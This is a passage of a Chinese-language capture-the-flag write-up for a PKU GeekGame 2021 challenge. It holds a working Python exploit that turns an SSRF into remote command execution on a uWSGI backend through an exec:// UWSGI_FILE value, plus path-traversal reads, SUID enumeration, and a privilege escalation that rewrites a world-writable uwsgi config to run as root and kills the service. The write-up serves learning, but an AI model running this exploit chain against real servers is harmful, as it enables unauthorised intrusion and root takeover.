    <span class="token comment"># s.headers['UWSGI_FILE'] = payload</span>
    <span class="token keyword">if</span> body<span class="token punctuation">:</span>
        <span class="token keyword">import</span> urlparse
        body_d <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>urlparse<span class="token punctuation">.</span>parse_qsl<span class="token punctuation">(</span>urlparse<span class="token punctuation">.</span>urlsplit<span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">.</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span>
        d <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>uri<span class="token punctuation">,</span> data<span class="token operator">=</span>body_d<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        d <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>uri<span class="token punctuation">)</span>

    <span class="token keyword">return</span> <span class="token punctuation">{</span>
        <span class="token string">'code'</span><span class="token punctuation">:</span> d<span class="token punctuation">.</span>status_code<span class="token punctuation">,</span>
        <span class="token string">'text'</span><span class="token punctuation">:</span> d<span class="token punctuation">.</span>text<span class="token punctuation">,</span>
        <span class="token string">'header'</span><span class="token punctuation">:</span> d<span class="token punctuation">.</span>headers
    <span class="token punctuation">}</span>


<span class="token keyword">def</span> <span class="token function">ask_uwsgi</span><span class="token punctuation">(</span>addr_and_port<span class="token punctuation">,</span> mode<span class="token punctuation">,</span> var<span class="token punctuation">,</span> body<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> mode <span class="token operator">==</span> <span class="token string">'tcp'</span><span class="token punctuation">:</span>
        s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>parse_addr<span class="token punctuation">(</span>addr_and_port<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> mode <span class="token operator">==</span> <span class="token string">'unix'</span><span class="token punctuation">:</span>
        s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_UNIX<span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>addr_and_port<span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>pack_uwsgi_vars<span class="token punctuation">(</span>var<span class="token punctuation">)</span> <span class="token operator">+</span> body<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    response <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token comment"># Actually we dont need the response, it will block if we run any commands.</span>
    <span class="token comment"># So I comment all the receiving stuff.</span>
    <span class="token comment"># while 1:</span>
    <span class="token comment">#     data = s.recv(4096)</span>
    <span class="token comment">#     if not data:</span>
    <span class="token comment">#         break</span>
    <span class="token comment">#     response.append(data)</span>
    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">curl</span><span class="token punctuation">(</span>mode<span class="token punctuation">,</span> addr_and_port<span class="token punctuation">,</span> payload<span class="token punctuation">,</span> target_url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    host<span class="token punctuation">,</span> uri <span class="token operator">=</span> get_host_from_url<span class="token punctuation">(</span>target_url<span class="token punctuation">)</span>
    path<span class="token punctuation">,</span> _<span class="token punctuation">,</span> qs <span class="token operator">=</span> uri<span class="token punctuation">.</span>partition<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> mode <span class="token operator">==</span> <span class="token string">'http'</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> fetch_data<span class="token punctuation">(</span>addr_and_port<span class="token operator">+</span>uri<span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
    <span class="token keyword">elif</span> mode <span class="token operator">==</span> <span class="token string">'tcp'</span><span class="token punctuation">:</span>
        host <span class="token operator">=</span> host <span class="token keyword">or</span> parse_addr<span class="token punctuation">(</span>addr_and_port<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        host <span class="token operator">=</span> addr_and_port
    var <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">'SERVER_PROTOCOL'</span><span class="token punctuation">:</span> <span class="token string">'HTTP/1.1'</span><span class="token punctuation">,</span>
        <span class="token string">'REQUEST_METHOD'</span><span class="token punctuation">:</span> <span class="token string">'GET'</span><span class="token punctuation">,</span>
        <span class="token string">'PATH_INFO'</span><span class="token punctuation">:</span> path<span class="token punctuation">,</span>
        <span class="token string">'REQUEST_URI'</span><span class="token punctuation">:</span> uri<span class="token punctuation">,</span>
        <span class="token string">'QUERY_STRING'</span><span class="token punctuation">:</span> qs<span class="token punctuation">,</span>
        <span class="token string">'SERVER_NAME'</span><span class="token punctuation">:</span> host<span class="token punctuation">,</span>
        <span class="token string">'HTTP_HOST'</span><span class="token punctuation">:</span> host<span class="token punctuation">,</span>
        <span class="token string">'UWSGI_FILE'</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span>
        <span class="token string">'SCRIPT_NAME'</span><span class="token punctuation">:</span> target_url
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> ask_uwsgi<span class="token punctuation">(</span>addr_and_port<span class="token punctuation">,</span> mode<span class="token punctuation">,</span> var<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span>
    host <span class="token operator">=</span> <span class="token string">"https://prob17-vvm2kfjo.geekgame.pku.edu.cn/"</span>
    cmd <span class="token operator">=</span> <span class="token string">'exec://'</span> <span class="token operator">+</span> command <span class="token operator">+</span> <span class="token string">" &gt; /tmp/miao; echo test"</span>
    payload <span class="token operator">=</span> curl<span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token string">"127.0.0.1:3031"</span><span class="token punctuation">,</span> cmd<span class="token punctuation">,</span> <span class="token string">'/src'</span><span class="token punctuation">)</span>
    payload_b64 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>payload_b64<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]Sending payload."</span><span class="token punctuation">)</span>
    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>
        host<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"server"</span><span class="token punctuation">:</span> <span class="token string">"127.0.0.1:3031"</span><span class="token punctuation">,</span> <span class="token string">"content"</span><span class="token punctuation">:</span> payload_b64<span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.25</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]Receiving result."</span><span class="token punctuation">)</span>
    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>host <span class="token operator">+</span> <span class="token string">'/module?log=../../../../../tmp/miao'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
    <span class="token comment"># print(r.text)</span>
    result <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'&lt;textarea rows="50" cols="80"&gt;(.*?)&lt;/textarea&gt;'</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>text<span class="token punctuation">,</span> re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>
    <span class="token comment"># print(result)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># command = "pkill -9 uwsgi"</span>
    command <span class="token operator">=</span> <span class="token string">"whoami"</span>
    command <span class="token operator">=</span> <span class="token string">"cat /flag"</span>
    command <span class="token operator">=</span> <span class="token string">"ps -ef"</span>
    exp<span class="token punctuation">(</span>command<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><em>（这个 exp 是最后改好的了</em></p>
<p><code>ls -al /</code></p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211118165305318.png" alt="ls -al /"></p>
<p>好不容易 RCE 了，但又不是完全 RCE，还得提权啊……</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">whoami</span> 
nobody
$ <span class="token function">find</span> / -perm -u<span class="token operator">=</span>s -type f <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null
/bin/su
/bin/umount
/bin/mount
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chfn
/usr/lib/openssh/ssh-keysign

$ <span class="token function">ls</span> -al /usr/lib/openssh/ssh-keysign
-rwsr-xr-x <span class="token number">1</span> root root <span class="token number">481608</span> Mar <span class="token number">13</span>  <span class="token number">2021</span> /usr/lib/openssh/ssh-keysign<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>看了一下发现这几个貌似都不能执行吧……</p>
<pre class="line-numbers language-none"><code class="language-none">/module?log=../../../../../../../tmp/supervisor.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211118172025073.png"></p>
<pre class="line-numbers language-none"><code class="language-none"># /tmp/supervisord.log

2021-11-18 08:35:57,151 CRIT Supervisor is running as root.  Privileges were not dropped because no user is specified in the config file.  If you intend to run as root, you can set user=root in the config file to avoid this message.
2021-11-18 08:35:57,153 INFO supervisord started with pid 8
2021-11-18 08:35:58,156 INFO spawned: 'chatbot' with pid 52
2021-11-18 08:35:58,158 INFO spawned: 'uwsgi' with pid 53
2021-11-18 08:36:03,393 INFO success: chatbot entered RUNNING state, process has stayed up for &gt; than 5 seconds (startsecs)
2021-11-18 08:36:03,393 INFO success: uwsgi entered RUNNING state, process has stayed up for &gt; than 5 seconds (startsecs)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">ps</span> -ef 
<span class="token environment constant">UID</span>          PID    <span class="token environment constant">PPID</span>  C STIME TTY          TIME CMD
root           <span class="token number">1</span>       <span class="token number">0</span>  <span class="token number">0</span> 08:35 ?        00:00:00 /sbin/docker-init -- <span class="token function">sh</span> run.sh
root           <span class="token number">8</span>       <span class="token number">1</span>  <span class="token number">0</span> 08:35 ?        00:00:01 /usr/local/bin/python /usr/local/bin/supervisord -n -c /etc/supervisor-ctf.conf
root          <span class="token number">14</span>       <span class="token number">8</span>  <span class="token number">0</span> 08:35 ?        00:00:00 socat UNIX-LISTEN:/sock/socat.sock,fork,reuseaddr TCP4:127.0.0.1:8080
root          <span class="token number">16</span>       <span class="token number">1</span>  <span class="token number">0</span> 08:35 ?        00:00:00 nginx: master process nginx -c /etc/nginx/nginx.conf
www-data      <span class="token number">17</span>      <span class="token number">16</span>  <span class="token number">0</span> 08:35 ?        00:00:00 nginx: worker process
www-data      <span class="token number">18</span>      <span class="token number">16</span>  <span class="token number">0</span> 08:35 ?        00:00:00 nginx: worker process
www-data      <span class="token number">19</span>      <span class="token number">16</span>  <span class="token number">0</span> 08:35 ?        00:00:00 nginx: worker process
www-data      <span class="token number">20</span>      <span class="token number">16</span>  <span class="token number">0</span> 08:35 ?        00:00:00 nginx: worker process
www-data      <span class="token number">21</span>      <span class="token number">16</span>  <span class="token number">0</span> 08:35 ?        00:00:00 nginx: worker process
www-data      <span class="token number">22</span>      <span class="token number">16</span>  <span class="token number">0</span> 08:35 ?        00:00:00 nginx: worker process
www-data      <span class="token number">23</span>      <span class="token number">16</span>  <span class="token number">0</span> 08:35 ?        00:00:00 nginx: worker process
www-data      <span class="token number">24</span>      <span class="token number">16</span>  <span class="token number">0</span> 08:35 ?        00:00:00 nginx: worker process
www-data      <span class="token number">25</span>      <span class="token number">16</span>  <span class="token number">0</span> 08:35 ?        00:00:00 nginx: worker process
www-data      <span class="token number">26</span>      <span class="token number">16</span>  <span class="token number">0</span> 08:35 ?        00:00:00 nginx: worker process
www-data      <span class="token number">27</span>      <span class="token number">16</span>  <span class="token number">0</span> 08:35 ?        00:00:00 nginx: worker process
www-data      <span class="token number">28</span>      <span class="token number">16</span>  <span class="token number">0</span> 08:35 ?        00:00:00 nginx: worker process
www-data      <span class="token number">29</span>      <span class="token number">16</span>  <span class="token number">0</span> 08:35 ?        00:00:00 nginx: worker process
www-data      <span class="token number">30</span>      <span class="token number">16</span>  <span class="token number">0</span> 08:35 ?        00:00:00 nginx: worker process
www-data      <span class="token number">31</span>      <span class="token number">16</span>  <span class="token number">0</span> 08:35 ?        00:00:00 nginx: worker process
www-data      <span class="token number">32</span>      <span class="token number">16</span>  <span class="token number">0</span> 08:35 ?        00:00:00 nginx: worker process
www-data      <span class="token number">33</span>      <span class="token number">16</span>  <span class="token number">0</span> 08:35 ?        00:00:00 nginx: worker process
www-data      <span class="token number">34</span>      <span class="token number">16</span>  <span class="token number">0</span> 08:35 ?        00:00:00 nginx: worker process
www-data      <span class="token number">35</span>      <span class="token number">16</span>  <span class="token number">0</span> 08:35 ?        00:00:00 nginx: worker process
www-data      <span class="token number">36</span>      <span class="token number">16</span>  <span class="token number">0</span> 08:35 ?        00:00:00 nginx: worker process
www-data      <span class="token number">37</span>      <span class="token number">16</span>  <span class="token number">0</span> 08:35 ?        00:00:00 nginx: worker process
www-data      <span class="token number">38</span>      <span class="token number">16</span>  <span class="token number">0</span> 08:35 ?        00:00:00 nginx: worker process
www-data      <span class="token number">39</span>      <span class="token number">16</span>  <span class="token number">0</span> 08:35 ?        00:00:00 nginx: worker process
www-data      <span class="token number">40</span>      <span class="token number">16</span>  <span class="token number">0</span> 08:35 ?        00:00:00 nginx: worker process
www-data      <span class="token number">41</span>      <span class="token number">16</span>  <span class="token number">0</span> 08:35 ?        00:00:00 nginx: worker process
www-data      <span class="token number">42</span>      <span class="token number">16</span>  <span class="token number">0</span> 08:35 ?        00:00:00 nginx: worker process
www-data      <span class="token number">43</span>      <span class="token number">16</span>  <span class="token number">0</span> 08:35 ?        00:00:00 nginx: worker process
www-data      <span class="token number">44</span>      <span class="token number">16</span>  <span class="token number">0</span> 08:35 ?        00:00:00 nginx: worker process
www-data      <span class="token number">45</span>      <span class="token number">16</span>  <span class="token number">0</span> 08:35 ?        00:00:00 nginx: worker process
www-data      <span class="token number">46</span>      <span class="token number">16</span>  <span class="token number">0</span> 08:35 ?        00:00:00 nginx: worker process
www-data      <span class="token number">47</span>      <span class="token number">16</span>  <span class="token number">0</span> 08:35 ?        00:00:00 nginx: worker process
www-data      <span class="token number">48</span>      <span class="token number">16</span>  <span class="token number">0</span> 08:35 ?        00:00:00 nginx: worker process
nobody        <span class="token number">52</span>       <span class="token number">8</span>  <span class="token number">0</span> 08:35 ?        00:00:00 python /usr/src/ufctf/chatbot.py
nobody        <span class="token number">53</span>       <span class="token number">8</span>  <span class="token number">0</span> 08:35 ?        00:00:00 uwsgi --ini /tmp/uwsgi-ctf.ini
nobody        <span class="token number">56</span>      <span class="token number">53</span>  <span class="token number">0</span> 08:35 ?        00:00:00 uwsgi --ini /tmp/uwsgi-ctf.ini
nobody        <span class="token number">57</span>      <span class="token number">53</span>  <span class="token number">0</span> 08:35 ?        00:00:00 uwsgi --ini /tmp/uwsgi-ctf.ini
nobody        <span class="token number">69</span>      <span class="token number">57</span>  <span class="token number">0</span> 08:39 ?        00:00:00 <span class="token punctuation">[</span>sh<span class="token punctuation">]</span> <span class="token operator">&lt;</span>defunct<span class="token operator">&gt;</span>
nobody       <span class="token number">132</span>      <span class="token number">57</span>  <span class="token number">0</span> 08:47 ?        00:00:00 <span class="token punctuation">[</span>sh<span class="token punctuation">]</span> <span class="token operator">&lt;</span>defunct<span class="token operator">&gt;</span>
nobody       <span class="token number">141</span>      <span class="token number">57</span>  <span class="token number">0</span> 08:49 ?        00:00:00 <span class="token punctuation">[</span>sh<span class="token punctuation">]</span> <span class="token operator">&lt;</span>defunct<span class="token operator">&gt;</span>
nobody       <span class="token number">152</span>      <span class="token number">56</span>  <span class="token number">0</span> 08:51 ?        00:00:00 <span class="token punctuation">[</span>sh<span class="token punctuation">]</span> <span class="token operator">&lt;</span>defunct<span class="token operator">&gt;</span>
nobody       <span class="token number">159</span>      <span class="token number">56</span>  <span class="token number">0</span> 08:52 ?        00:00:00 <span class="token punctuation">[</span>sh<span class="token punctuation">]</span> <span class="token operator">&lt;</span>defunct<span class="token operator">&gt;</span>
nobody       <span class="token number">182</span>      <span class="token number">57</span>  <span class="token number">0</span> 08:55 ?        00:00:00 <span class="token punctuation">[</span>sh<span class="token punctuation">]</span> <span class="token operator">&lt;</span>defunct<span class="token operator">&gt;</span>
nobody       <span class="token number">198</span>      <span class="token number">57</span>  <span class="token number">0</span> 08:59 ?        00:00:00 <span class="token punctuation">[</span>sh<span class="token punctuation">]</span> <span class="token operator">&lt;</span>defunct<span class="token operator">&gt;</span>
nobody       <span class="token number">207</span>      <span class="token number">56</span>  <span class="token number">0</span> 09:00 ?        00:00:00 <span class="token punctuation">[</span>sh<span class="token punctuation">]</span> <span class="token operator">&lt;</span>defunct<span class="token operator">&gt;</span>
nobody       <span class="token number">216</span>      <span class="token number">56</span>  <span class="token number">0</span> 09:09 ?        00:00:00 <span class="token punctuation">[</span>sh<span class="token punctuation">]</span> <span class="token operator">&lt;</span>defunct<span class="token operator">&gt;</span>
nobody       <span class="token number">223</span>      <span class="token number">56</span>  <span class="token number">0</span> 09:10 ?        00:00:00 <span class="token punctuation">[</span>sh<span class="token punctuation">]</span> <span class="token operator">&lt;</span>defunct<span class="token operator">&gt;</span>
nobody       <span class="token number">249</span>      <span class="token number">56</span>  <span class="token number">0</span> 09:32 ?        00:00:00 <span class="token punctuation">[</span>sh<span class="token punctuation">]</span> <span class="token operator">&lt;</span>defunct<span class="token operator">&gt;</span>
nobody       <span class="token number">255</span>      <span class="token number">56</span>  <span class="token number">0</span> 09:33 ?        00:00:00 <span class="token punctuation">[</span>sh<span class="token punctuation">]</span> <span class="token operator">&lt;</span>defunct<span class="token operator">&gt;</span>
nobody       <span class="token number">264</span>      <span class="token number">56</span>  <span class="token number">0</span> 09:34 ?        00:00:00 <span class="token punctuation">[</span>sh<span class="token punctuation">]</span> <span class="token operator">&lt;</span>defunct<span class="token operator">&gt;</span>
nobody       <span class="token number">273</span>      <span class="token number">56</span>  <span class="token number">0</span> 09:35 ?        00:00:00 <span class="token punctuation">[</span>sh<span class="token punctuation">]</span> <span class="token operator">&lt;</span>defunct<span class="token operator">&gt;</span>
nobody       <span class="token number">282</span>      <span class="token number">56</span>  <span class="token number">0</span> 09:37 ?        00:00:00 <span class="token punctuation">[</span>sh<span class="token punctuation">]</span> <span class="token operator">&lt;</span>defunct<span class="token operator">&gt;</span>
nobody       <span class="token number">295</span>      <span class="token number">56</span>  <span class="token number">1</span> 09:45 ?        00:00:00 <span class="token punctuation">[</span>sh<span class="token punctuation">]</span> <span class="token operator">&lt;</span>defunct<span class="token operator">&gt;</span>
root         <span class="token number">303</span>      <span class="token number">14</span>  <span class="token number">0</span> 09:45 ?        00:00:00 socat UNIX-LISTEN:/sock/socat.sock,fork,reuseaddr TCP4:127.0.0.1:8080
nobody       <span class="token number">304</span>      <span class="token number">56</span>  <span class="token number">0</span> 09:45 ?        00:00:00 /bin/sh -c <span class="token function">ps</span> -ef <span class="token operator">&gt;</span> /tmp/miao<span class="token punctuation">;</span> <span class="token builtin class-name">echo</span> <span class="token builtin class-name">test</span>
nobody       <span class="token number">305</span>     <span class="token number">304</span>  <span class="token number">0</span> 09:45 ?        00:00:00 <span class="token function">ps</span> -ef<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里面可疑的有 nginx，socat，supervisord。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ pip list
Package            Version
------------------ --------
click              <span class="token number">8.0</span>.3
Flask              <span class="token number">2.0</span>.2
importlib-metadata <span class="token number">4.8</span>.2
itsdangerous       <span class="token number">2.0</span>.1
Jinja2             <span class="token number">3.0</span>.3
MarkupSafe         <span class="token number">2.0</span>.1
pip                <span class="token number">21.2</span>.4
setuptools         <span class="token number">57.5</span>.0
supervisor         <span class="token number">4.2</span>.2
typing-extensions  <span class="token number">3.10</span>.0.2
uWSGI              <span class="token number">2.0</span>.20
Werkzeug           <span class="token number">2.0</span>.2
wheel              <span class="token number">0.37</span>.0
zipp               <span class="token number">3.6</span>.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>supervisor 挺新的，没有 RCE 的 CVE 了。</p>
<p>通过 <code>nginx.conf</code> 进一步读到网页配置文件 <code>nginx-ctf.conf</code></p>
<pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token keyword">upstream</span> uwsgi <span class="token punctuation">{</span>
    <span class="token comment"># server unix:///path/to/your/mysite/mysite.sock; # for a file socket</span>
    <span class="token keyword">server</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">3031</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment"># configuration of the server</span>
<span class="token keyword">server</span> <span class="token punctuation">{</span>
    <span class="token comment"># the port your site will be served on</span>
    <span class="token keyword">listen</span>      <span class="token number">8080</span><span class="token punctuation">;</span>
    <span class="token comment"># the domain name it will serve for</span>
    <span class="token keyword">server_name</span> localhost<span class="token punctuation">;</span> 
    <span class="token keyword">charset</span>     utf<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">;</span>

    <span class="token comment"># max upload size</span>
    <span class="token keyword">client_max_body_size</span> <span class="token number">2</span>M<span class="token punctuation">;</span>   <span class="token comment"># adjust to taste</span>

    <span class="token comment"># Django media</span>
    <span class="token keyword">location</span> <span class="token operator">/</span>media<span class="token operator">/</span>  <span class="token punctuation">{</span>
        <span class="token keyword">alias</span> <span class="token operator">/</span>usr<span class="token operator">/</span>files<span class="token operator">/</span>media<span class="token operator">/</span><span class="token punctuation">;</span>  <span class="token comment"># your Django project's media files - amend as required</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">location</span> <span class="token operator">/</span>static<span class="token operator">/</span> <span class="token punctuation">{</span>
        <span class="token keyword">alias</span> <span class="token operator">/</span>usr<span class="token operator">/</span>files<span class="token operator">/</span>static<span class="token operator">/</span><span class="token punctuation">;</span> <span class="token comment"># your Django project's static files - amend as required</span>
    <span class="token punctuation">}</span>

    <span class="token comment"># Finally, send all non-media requests to the uwsgi</span>
    <span class="token keyword">location</span> <span class="token operator">/</span> <span class="token punctuation">{</span>
        uwsgi_pass  uwsgi<span class="token punctuation">;</span>
        <span class="token keyword">include</span>     <span class="token operator">/</span>etc<span class="token operator">/</span>nginx<span class="token operator">/</span>uwsgi_params<span class="token punctuation">;</span> <span class="token comment"># the uwsgi_params file you installed</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以知道是代理了 8080 端口给 uwsgi 后端 127.0.0.1:3031，而 <code>run.sh</code> 里有个 socat</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">socat UNIX-LISTEN:/sock/socat.sock,fork,reuseaddr TCP4:127.0.0.1:8080 <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>他把这个 8080 又 fork 到了 <code>/sock/socat.sock</code>，可能是为了 docker 部署用的？不懂了。</p>
<p>再回去看 supervisord 和 uwsgi 的配置文件，发现这个 <code>uwsgi-ctf.ini</code> 可写啊！</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">-rw-rw-rw- <span class="token number">1</span> root root <span class="token number">210</span> Nov <span class="token number">11</span> <span class="token number">18</span>:21 /tmp/uwsgi-ctf.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>而且 uwsgi 是可以自动重启的。</p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211118235419380.png"></p>
<p><strong>那就可以把里面的 nobody 换成 root，然后 kill 掉原来的让 supervisor 重启，不就完事了！</strong></p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211119003135436.png"></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># sed -i 's/nobody/root/g' /tmp/uwsgi-ctf.ini</span>
<span class="token comment"># 然而不懂为啥没改成功，于是先写到别的文件，再覆盖过去，这里覆盖就别用exp里的了，输出重定向这里单独写</span>
$ <span class="token function">sed</span> <span class="token string">'s/nobody/root/g'</span> /tmp/uwsgi-ctf.ini <span class="token operator">&gt;</span> /tmp/test
$ <span class="token function">cat</span> /tmp/test <span class="token operator">&gt;</span> /tmp/uwsgi-ctf.ini<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>（赛后看其他师傅wp，原因应该是 <code>sed</code> 替换的时候需要创建临时文件，但题目没法创建临时文件</p>
<p>然后再看这个文件，发现就改好了。</p>
<p>再把 uwsgi kill 掉。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">pkill</span> -9 uwsgi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>等一会儿，发现会有一段时间 502 了，而后又恢复了。</p>
<p>可以看看 <code>/tmp/supervisord.log</code>，发现确实重启了。</p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211118200418276.png"></p>
<p>看当前用户，就发现是 root 了。</p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211118200856993.png"></p>
<p>那就能读 flag 了，好耶！太顶了啊！！！</p>
<p><img src="/2021/11/25/CTF_2021PKUGeekGame/image-20211118200133933.png"></p>
<p><code>flag{UWSG1_is_n0t_SafE_wheN_SSrf}</code></p>
<blockquote>
<p>另外，还可以通过改 uwsgi 配置文件，用 <code>print = @(/flag)</code> 的形式来把 <code>/flag</code> 包含进来作为启动时打印的信息，然后利用任意读文件漏洞来读日志文件 <code>/tmp/supervisor.log</code></p>
</blockquote>
